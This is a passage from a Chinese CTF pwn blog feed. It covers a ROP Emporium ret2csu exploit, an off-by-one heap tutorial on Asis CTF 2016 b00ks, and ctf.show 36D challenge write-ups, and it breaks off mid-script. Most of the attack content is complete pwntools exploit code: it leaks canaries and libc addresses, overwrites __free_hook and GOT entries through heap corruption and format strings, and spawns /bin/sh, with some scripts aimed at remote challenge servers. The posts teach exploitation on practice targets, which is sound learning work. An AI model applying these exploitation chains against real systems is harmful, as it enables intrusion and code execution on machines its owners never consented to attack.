<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&#39;utf-8&#39;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;ret2csu&#39;)</span><br><span class="line">#elf&#x3D;ELF(&#39;.&#x2F;ret2csu&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">ret2win&#x3D;0x00000000004007b1</span><br><span class="line">gadget_one&#x3D;0x000000000040089a</span><br><span class="line">gadget_two&#x3D;0x0000000000400880</span><br><span class="line">init_por&#x3D;0x600e38</span><br><span class="line">rdx&#x3D;0xdeadcafebabebeef</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x20+&#39;a&#39;*8</span><br><span class="line">payload+&#x3D;p64(gadget_one)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(0x01)</span><br><span class="line">payload+&#x3D;p64(init_por)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(rdx)</span><br><span class="line">payload+&#x3D;p64(gadget_two)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload+&#x3D;&#39;a&#39;*56</span><br><span class="line">payload+&#x3D;p64(ret2win)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>判断异或数是多少可以绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binsh &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">badchar &#x3D; [98, 105, 99, 47, 32, 102, 110, 115]</span><br><span class="line">xornum &#x3D; 1</span><br><span class="line">while 1:</span><br><span class="line">    for x in binsh:</span><br><span class="line">        tmp &#x3D; ord(x) ^ xornum</span><br><span class="line">        if tmp in badchar:</span><br><span class="line">            xornum +&#x3D; 1</span><br><span class="line">            break</span><br><span class="line">        if x &#x3D;&#x3D; &quot;\x00&quot;:</span><br><span class="line">            print (xornum)</span><br><span class="line">            xornum +&#x3D;1</span><br><span class="line">    if xornum &#x3D;&#x3D; 10:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>ROP Emporium</category>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ROP Emporium</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>off-by-one</title>
    <url>/2020/05/07/off-by-one/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/1dRlApQUyVtZrgi.jpg" alt="alt"></p>
<a id="more"></a>

<h2 id="堆中的-Off-By-One"><a href="#堆中的-Off-By-One" class="headerlink" title="堆中的 Off-By-One"></a>堆中的 Off-By-One</h2><h3 id="pwn堆入门系列教程1"><a href="#pwn堆入门系列教程1" class="headerlink" title="pwn堆入门系列教程1"></a>pwn堆入门系列教程1</h3><p>最近几天时间都在CTF wiki上学习堆利用，花了好长时间学习了off-by-one的利用。</p>
<h3 id="介绍（引用ctf-wiki）"><a href="#介绍（引用ctf-wiki）" class="headerlink" title="介绍（引用ctf wiki）"></a>介绍（引用ctf wiki）</h3><p>严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p>
<h3 id="off-by-one-漏洞原理-（引用ctf-wiki）"><a href="#off-by-one-漏洞原理-（引用ctf-wiki）" class="headerlink" title="off-by-one 漏洞原理 （引用ctf wiki）"></a>off-by-one 漏洞原理 （引用ctf wiki）</h3><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p>
<ul>
<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
<li>字符串操作不合适</li>
</ul>
<p>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上（heap based） 的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p>
<h3 id="off-by-one-利用思路-（引用ctf-wiki）"><a href="#off-by-one-利用思路-（引用ctf-wiki）" class="headerlink" title="off-by-one 利用思路 （引用ctf wiki）"></a>off-by-one 利用思路 （引用ctf wiki）</h3><ol>
<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>
<li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。</li>
</ol>
<p>off-by-one（这样的漏洞在刚开始学习写代码的时候特别容易出现）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">char</span> a[<span class="number">10</span>];</span><br><span class="line">		<span class="keyword">int</span> i;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">			&#123;</span><br><span class="line">				a[i]=i;</span><br><span class="line">			&#125;</span><br><span class="line">		a[<span class="number">10</span>]=<span class="string">'\0'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	 &#125;</span><br></pre></td></tr></table></figure>

<p>数组总长度是10，从0开始，到9结束。程序错误的使用了a[10]，造成了off-by-one。</p>
<h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h3><p>这道题是wiki上关于off-by-one的利用，我按照wiki上的exp，一步一步慢慢调试，终于弄会了，wiki上有俩种利用方法，目前我只弄会了第一种，第二种我会在后续发出来。</p>
<h4 id="checksec检查："><a href="#checksec检查：" class="headerlink" title="checksec检查："></a>checksec检查：</h4><p>​        </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>



<h4 id="漏洞："><a href="#漏洞：" class="headerlink" title="漏洞："></a>漏洞：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax@2</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter author name: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_9F5(off_202018, <span class="number">32</span>) ) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fail to read author_name"</span>, <span class="number">32L</span>L);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_9F5</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+14h] [bp-Ch]@3</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [sp+18h] [bp-8h]@3</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf = a1;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i ) <span class="comment">//最多可以将名字长度写成32字符</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)buf == <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      buf = (<span class="keyword">char</span> *)buf + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)buf = <span class="number">0</span>;  <span class="comment">//危险部分</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><h5 id="b00k结构体"><a href="#b00k结构体" class="headerlink" title="b00k结构体"></a><code>b00k</code>结构体</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct book&#123;</span><br><span class="line">    int id;</span><br><span class="line">    char *name;</span><br><span class="line">    char *description;</span><br><span class="line">    int size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  程序运行, 创建一个结构体数组,设为<code>b00ks</code>.</p>
<h5 id="b00k位置"><a href="#b00k位置" class="headerlink" title="b00k位置"></a><code>b00k</code>位置</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;30gx 0x555555756040</span><br><span class="line">0x555555756040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555756050:	0x6161616161616161	0x6161616161616161 ----&gt;author name</span><br><span class="line">b00ks&lt;--0x555555756060:	0x0000555555757480(frist b00ks)	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>author name我们可以写入32个字符，程序会在最后加入‘\x00’，当我们创建book1时，frist b00ks会覆盖掉我们的‘\x00’,当我们输出author name时，我们就可以泄露出frist b00ks指针的地址了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def create(name_size,name,des_size,description):</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(str(1))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(name_size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(name)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(des_size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(description)</span><br><span class="line"> def printf () :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(&#39;4&#39;)</span><br><span class="line"> </span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*32</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">create(30,&#39;bb&#39;,255,&#39;cc&#39;)</span><br><span class="line">printf()</span><br><span class="line">sh.recvuntil(&#39;a&#39;*32)</span><br><span class="line">books_one&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print (&#39;books_one:&#39; +hex(books_one))</span><br></pre></td></tr></table></figure>

<h5 id="创建第一个first-b00k"><a href="#创建第一个first-b00k" class="headerlink" title="创建第一个first b00k"></a>创建第一个<code>first b00k</code></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x555b07c4f160:	0x0000000000000001	0x0000555b07c4f020</span><br><span class="line">0x555b07c4f170:	0x0000555b07c4f050	0x00000000000000ff</span><br></pre></td></tr></table></figure>

<p>当我们开辟一个足够大的description，然后再一次修改author name，覆盖frist b00ks指针的最后一个字节，frist b00ks就会指向description，我们可以伪造一个b00k，让其中的name和description指向book2的name和description。这样我们就可以达到任意读写的目的。</p>
<h5 id="空字节覆盖"><a href="#空字节覆盖" class="headerlink" title="空字节覆盖"></a>空字节覆盖</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x557649c66040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x557649c66050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x557649c66060:	0x000055764b977100	0x000055764b977190</span><br></pre></td></tr></table></figure>

<h5 id="伪造b00k"><a href="#伪造b00k" class="headerlink" title="伪造b00k"></a>伪造b00k</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x55764b9770f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55764b977100:	0x0000000000000001	0x000055764b977198 ----</span><br><span class="line">0x55764b977110:	0x000055764b9771a0	0x000000000000ffff	   |</span><br><span class="line">0x55764b977120:	0x0000000000000000	0x0000000000000000     |</span><br><span class="line">0x55764b977130:	0x0000000000000000	0x0000000000000000     |</span><br><span class="line">0x55764b977140:	0x0000000000000000	0x0000000000000000     |</span><br><span class="line">0x55764b977150:	0x0000000000000000	0x0000000000000031     |</span><br><span class="line">0x55764b977160:	0x0000000000000001	0x000055764b977020     |</span><br><span class="line">0x55764b977170:	0x000055764b977050	0x00000000000000ff     |</span><br><span class="line">0x55764b977180:	0x0000000000000000	0x0000000000000031     |</span><br><span class="line">0x55764b977190:	0x0000000000000002	0x00007f4c77d67010 &lt;-- |</span><br><span class="line">0x55764b9771a0:	0x00007f4c77b847a8	0x0000000000021000</span><br></pre></td></tr></table></figure>

<p>因为第二次申请了很大的chunk，所以程序会使用mmap来进行堆的申请，所以<code>second b00k</code>的<code>name pointer</code>和<code>description pointer</code>的指针可以用来泄露libc_base</p>
<h5 id="泄露libc-base"><a href="#泄露libc-base" class="headerlink" title="泄露libc_base"></a>泄露libc_base</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;&#39;a&#39;*0xb0+p64(0x1)+p64(books_one+0x38)+p64(books_one+0x40)+p64(0xffff)</span><br><span class="line">edit(1,payload)</span><br><span class="line">payload&#x3D;&#39;a&#39;*32</span><br><span class="line">change(payload)</span><br><span class="line"></span><br><span class="line">printf()</span><br><span class="line">sh.recvuntil(&#39;Name: &#39;)</span><br><span class="line">name_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.recvuntil(&#39;Description: &#39;)</span><br><span class="line">description_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print (&#39;name_addr:&#39; +hex(name_addr))</span><br><span class="line">print(&#39;description_addr:&#39; +hex(description_addr))</span><br><span class="line">#libc_base&#x3D;description_addr-0x587010</span><br><span class="line">libc_base&#x3D;name_addr-0x5a9010</span><br><span class="line">print(&#39;libc_base:&#39; +hex(libc_base))</span><br></pre></td></tr></table></figure>

<h5 id="获取指针"><a href="#获取指针" class="headerlink" title="获取指针"></a>获取指针</h5><p>我们还需要获取__free_hook指针和execve（‘/bin/sh’）的偏移，这里我们用one_gadget来获取。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">free_hook&#x3D;libc.symbols[&#39;__free_hook&#39;]+libc_base</span><br><span class="line">execve_addr&#x3D;libc_base+offset</span><br></pre></td></tr></table></figure>

<h5 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h5><p>最后我们只需要通过修改我们伪造的b00k1的description为free_hook的指针地址，将b00k2的description填入execve的地址，然后delete b00k2就好了。</p>
<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># coding&#x3D;&#39;utf-8&#39;</span><br><span class="line">from pwn import *</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;b00ks&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">def create(name_size,name,des_size,description):</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(str(1))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(name_size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(name)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(des_size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(description)</span><br><span class="line"></span><br><span class="line">def delete (number) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(str(2))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(number))</span><br><span class="line"></span><br><span class="line">def edit(number,data) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(number))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(data)</span><br><span class="line"></span><br><span class="line">def printf () :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(&#39;4&#39;)</span><br><span class="line"></span><br><span class="line">def change (payload) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(&#39;5&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*32</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">create(30,&#39;bb&#39;,255,&#39;cc&#39;)</span><br><span class="line">create(0x21000,&#39;bb&#39;,0x21000,&#39;cc&#39;)</span><br><span class="line">printf()</span><br><span class="line">sh.recvuntil(&#39;a&#39;*32)</span><br><span class="line">books_one&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print (&#39;books_one:&#39; +hex(books_one))</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0xb0+p64(0x1)+p64(books_one+0x38)+p64(books_one+0x40)+p64(0xffff)</span><br><span class="line">edit(1,payload)</span><br><span class="line">payload&#x3D;&#39;a&#39;*32</span><br><span class="line">change(payload)</span><br><span class="line"></span><br><span class="line">printf()</span><br><span class="line">sh.recvuntil(&#39;Name: &#39;)</span><br><span class="line">name_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.recvuntil(&#39;Description: &#39;)</span><br><span class="line">description_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print (&#39;name_addr:&#39; +hex(name_addr))</span><br><span class="line">print(&#39;description_addr:&#39; +hex(description_addr))</span><br><span class="line">#libc_base&#x3D;description_addr-0x587010</span><br><span class="line">libc_base&#x3D;name_addr-0x5a9010</span><br><span class="line">print(&#39;libc_base:&#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">#offset&#x3D;0x45216</span><br><span class="line">offset&#x3D;0x4526a</span><br><span class="line">free_hook&#x3D;libc.symbols[&#39;__free_hook&#39;]+libc_base</span><br><span class="line">execve_addr&#x3D;libc_base+offset</span><br><span class="line">print(&#39;free_hook:&#39; +hex(free_hook))</span><br><span class="line">print(&#39;execve_addr:&#39; +hex(execve_addr))</span><br><span class="line"></span><br><span class="line">payload&#x3D;p64(free_hook)</span><br><span class="line">edit(1,payload)</span><br><span class="line">payload&#x3D;p64(execve_addr)</span><br><span class="line">edit(2,payload)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">delete(2)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>参考:<a href="http://noonegroup.xyz/posts/1a1c1b4a/" target="_blank" rel="noopener external nofollow noreferrer">http://noonegroup.xyz/posts/1a1c1b4a/</a></p>
<p>参考:<a href="https://bbs.pediy.com/thread-225611.htm" target="_blank" rel="noopener external nofollow noreferrer">https://bbs.pediy.com/thread-225611.htm</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-36D-PWN-WP</title>
    <url>/2020/05/07/CTF-36D-PWN-WP/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/3p6gUVzQaCwkTbs.jpg" alt="alt"></p>
<a id="more"></a>

<p>感谢1p0ch师傅</p>
<p>最近参加了ctf.show举办的一个比赛，做了一下pwn题，以下是我的一些wp，由于本人能力有限，菜的一批，如果有什么不对的地方，请多包含。</p>
<h3 id="PWN-签到"><a href="#PWN-签到" class="headerlink" title="PWN_签到"></a>PWN_签到</h3><p>签到题直接nc上去以后发现考察的是linux的基本操作，程序过滤掉了空格，cat，但是我们可以ls查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">more&lt;flag               这里&lt;可以绕过空格</span><br></pre></td></tr></table></figure>

<h3 id="PWN-babyFmtstr"><a href="#PWN-babyFmtstr" class="headerlink" title="PWN_babyFmtstr"></a>PWN_babyFmtstr</h3><p>格式化字符串漏洞，我们可以修改got表，这样就有一个无限格式化字符串漏洞的程序了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&#39;124.156.121.112&#39;,28028)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn2&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn2&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">printf_got&#x3D;elf.got[&#39;printf&#39;]</span><br><span class="line"></span><br><span class="line">memset_addr&#x3D;elf.got[&#39;memset&#39;]</span><br><span class="line">#0x0400AA0</span><br><span class="line">payload1&#x3D;&#39;%64c%11$hn%2656c%12$hnAA&#39;+p64(memset_addr+2)+p64(memset_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;AAAA%9$s&#39;+p64(puts_got)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;please input name:\n&#39;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.recvuntil(&#39;Hello AAAA&#39;)</span><br><span class="line">puts_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print  (&#39;puts_addr:&#39; +hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&#39;puts&#39;,puts_addr)</span><br><span class="line">libc_base&#x3D;puts_addr-libc.dump(&#39;puts&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh&#x3D;libc_base+libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line">print(&#39;system_addr:&#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">def set_printf_to_system(system):</span><br><span class="line">	printf_got_addr&#x3D;printf_got</span><br><span class="line">	x &#x3D; system &amp; 0xffffffff</span><br><span class="line">	a &#x3D; x &amp; 0xffff</span><br><span class="line">	a1 &#x3D; printf_got_addr</span><br><span class="line">	b &#x3D; (x&gt;&gt;16) &amp; 0xffff</span><br><span class="line">	b1&#x3D;printf_got_addr+2</span><br><span class="line">	if(a&gt;b):</span><br><span class="line">		tmp&#x3D;a</span><br><span class="line">		a&#x3D;b</span><br><span class="line">		b&#x3D;tmp</span><br><span class="line">		tmp&#x3D;a1</span><br><span class="line">		a1&#x3D;b1</span><br><span class="line">		b1&#x3D;tmp</span><br><span class="line">	s&#x3D;&quot;%&quot;+str(a)+&quot;c&quot;</span><br><span class="line">	s+&#x3D;&quot;%12$hn&quot;</span><br><span class="line">	s+&#x3D;&quot;%&quot;+str(b-a)+&quot;c&quot;</span><br><span class="line">	s+&#x3D;&quot;%13$hn&quot;</span><br><span class="line">	for i in range(32-len(s)):</span><br><span class="line">		s+&#x3D;&#39;a&#39;</span><br><span class="line">	s+&#x3D;p64(a1)</span><br><span class="line">	s+&#x3D;p64(b1)</span><br><span class="line">	return s</span><br><span class="line"></span><br><span class="line">payload3&#x3D;set_printf_to_system(system_addr)</span><br><span class="line">print (str(payload3))</span><br><span class="line">#gdb,attach(sh)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">payload4&#x3D;&#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">sh.sendline(payload4)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="PWN-MagicString"><a href="#PWN-MagicString" class="headerlink" title="PWN_MagicString"></a>PWN_MagicString</h3><p>程序中没有参数，传入/bin/sh\x00，就可以getshell了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&#39;124.156.121.112&#39;,28095)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">gets_plt&#x3D;elf.plt[&#39;gets&#39;]</span><br><span class="line">system_plt&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line">pop_rdi&#x3D;0x0000000000400733</span><br><span class="line">bss_addr&#x3D;0x601080</span><br><span class="line">main_addr&#x3D;0x0000000000400661</span><br><span class="line">payload1&#x3D;&#39;a&#39;*0x2a0+&#39;a&#39;*8+p64(pop_rdi)+p64(bss_addr)+p64(gets_plt)+p64(main_addr)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">payload2&#x3D;&#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">payload3&#x3D;&#39;a&#39;*0x2a0+&#39;a&#39;*8+p64(pop_rdi)+p64(bss_addr)+p64(system_plt)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="PWN-MengxinStack"><a href="#PWN-MengxinStack" class="headerlink" title="PWN_MengxinStack"></a>PWN_MengxinStack</h3><p>程序开启了canary，pie，首先我们泄露canary，然后覆盖返回地址的最后一个字节，让程序可以重新执行，之后再泄露libc，最后one_gadget就可以getshell了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">sh&#x3D;remote(&#39;124.156.121.112&#39;,28090)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn4&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn4&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">payload1&#x3D;&#39;A&#39;*0x29</span><br><span class="line">sh.send(payload1)</span><br><span class="line">sh.recvuntil(&#39;A&#39;*0x28)</span><br><span class="line">canary&#x3D;u64(sh.recv(8))-0x41</span><br><span class="line">print (&#39;canary:&#39; +hex(canary))</span><br><span class="line">ret_addr&#x3D;0xffffffffff600400</span><br><span class="line">ret&#x3D;0xffffffffff600409</span><br><span 